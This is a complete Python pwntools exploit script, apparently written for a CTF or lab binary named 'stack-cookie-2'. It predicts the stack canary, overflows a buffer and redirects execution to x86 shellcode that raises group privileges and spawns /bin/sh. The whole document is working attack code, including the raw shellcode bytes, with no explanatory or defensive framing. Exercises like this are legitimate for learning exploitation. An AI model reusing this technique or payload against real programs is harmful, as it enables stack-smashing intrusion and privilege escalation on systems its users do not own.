#!/usr/bin/env python
from pwn import *

#SHELLCODE = 'SET YOUR SHELLCODE HERE'
SHELLCODE = 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'

# You may set your shellcode in ENVP...
ENV = { 'SHELLCODE' : SHELLCODE }

# You may set your shellcode in ARGV...
ARG1 = ''

# Generate the rand cookies
p = process("./rand")
data = p.readline()
cookie = int(data)
print("addr_of_cookie %s" % cookie)
addr_of_cookie = hex(cookie)
print("stack %s" % addr_of_cookie)

p = process("./stack-cookie-2", env=ENV)
# match the cookie, and intentionally generate a crash to get the address of 'shellcode'
string = "A" * 0x84 + p32(cookie) + "CCCC" + "DDDD"
p.send(string)
p.wait()
c = Core('core')
addr_of_shellcode = c.stack.find(SHELLCODE)
print("addr_of_sh %s" % addr_of_shellcode )
print("stack %s" % hex(addr_of_shellcode))

p = process("./stack-cookie-2", env=ENV)
#     [ BUFFER 0x84 ]  [COOKIE]    [Saved ebp]      [retaddr]
string = "A" * 0x84 + p32(cookie) + "CCCC" + p32(addr_of_shellcode)

p.send(string)

p.interactive()
